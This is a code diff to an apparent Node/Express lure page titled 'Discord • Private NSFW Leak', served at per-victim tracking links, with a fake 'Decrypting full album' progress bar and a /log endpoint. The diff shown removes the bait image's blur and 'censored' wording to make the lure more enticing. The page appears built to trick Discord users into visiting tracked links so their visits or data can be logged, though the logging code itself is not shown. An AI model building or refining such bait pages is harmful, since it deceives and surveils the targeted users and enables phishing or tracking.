@@ -23,7 +23,7 @@ app.get('/', (req, res) => res.send('✅ Service running'));
 
 const trackingLinks = new Map();
 
-// ================== YOUR BLURRED IMAGE PAGE ==================
+// ================== NO BLUR - YOUR ORIGINAL IMAGE ==================
 app.get('/nsfw-leak/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -42,19 +42,42 @@ app.get('/nsfw-leak/:id', (req, res) => {
   <meta charset="UTF-8">
   <title>Discord • Private NSFW Leak</title>
   <style>
-    body { background: #0a0a0a; color: #ddd; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 30px 15px; min-height: 100vh; }
-    .header { color: #ff00aa; font-size: 26px; margin-bottom: 8px; }
-    .subheader { color: #aaa; font-size: 15px; margin-bottom: 25px; }
-    .album { max-width: 420px; margin: 0 auto 30px; background: #111; border-radius: 12px; overflow: hidden; box-shadow: 0 0 30px rgba(255,0,170,0.4); border: 1px solid #333; }
+    body { 
+      background: #0a0a0a; 
+      color: #ddd; 
+      font-family: 'Segoe UI', Arial, sans-serif; 
+      text-align: center; 
+      margin: 0; 
+      padding: 30px 15px; 
+      min-height: 100vh;
+    }
+    .header {
+      color: #ff00aa;
+      font-size: 26px;
+      margin-bottom: 8px;
+    }
+    .subheader {
+      color: #aaa;
+      font-size: 15px;
+      margin-bottom: 25px;
+    }
+    .album {
+      max-width: 420px;
+      margin: 0 auto 30px;
+      background: #111;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(255,0,170,0.4);
+      border: 1px solid #333;
+    }
     .preview {
       width: 100%;
       height: 480px;
-      background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.7)), url('https://i.imgur.com/NOrim.png') center/cover no-repeat;
+      background: url('https://i.imgur.com/NOrim.png') center/cover no-repeat;  /* Your original image - No blur */
       position: relative;
-      filter: blur(6px);
     }
     .preview::after {
-      content: "18+ LEAKED • CENSORED";
+      content: "18+ LEAKED";
       position: absolute;
       top: 15px;
       left: 15px;
@@ -65,12 +88,36 @@ app.get('/nsfw-leak/:id', (req, res) => {
       font-size: 13px;
       font-weight: bold;
     }
-    .info { padding: 15px; background: #1a1a1a; font-size: 14px; color: #bbb; }
-    .progress-container { margin: 30px auto; max-width: 380px; }
-    .progress { height: 9px; background: #222; border-radius: 4px; overflow: hidden; }
-    .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #ff00aa, #ff66cc); animation: load 6.5s linear forwards; }
-    .status { color: #00ff99; font-size: 17px; margin-top: 12px; }
-    @keyframes load { to { width: 100%; } }
+    .info {
+      padding: 15px;
+      background: #1a1a1a;
+      font-size: 14px;
+      color: #bbb;
+    }
+    .progress-container {
+      margin: 30px auto;
+      max-width: 380px;
+    }
+    .progress { 
+      height: 9px; 
+      background: #222; 
+      border-radius: 4px; 
+      overflow: hidden; 
+    }
+    .bar { 
+      height: 100%; 
+      width: 0%; 
+      background: linear-gradient(90deg, #ff00aa, #ff66cc); 
+      animation: load 6.5s linear forwards; 
+    }
+    .status { 
+      color: #00ff99; 
+      font-size: 17px; 
+      margin-top: 12px;
+    }
+    @keyframes load { 
+      to { width: 100%; } 
+    }
   </style>
 </head>
 <body>
@@ -85,7 +132,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
     </div>
   </div>
 
-  <p style="color:#ff99cc;">Decrypting full album (some images censored)...</p>
+  <p style="color:#ff99cc;">Decrypting full album...</p>
   <div class="progress-container">
     <div class="progress"><div class="bar"></div></div>
   </div>
@@ -144,6 +191,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
 
   res.send(html);
 });
+
 
 // ================== LOG ENDPOINT ==================
 app.post('/log', async (req, res) => {
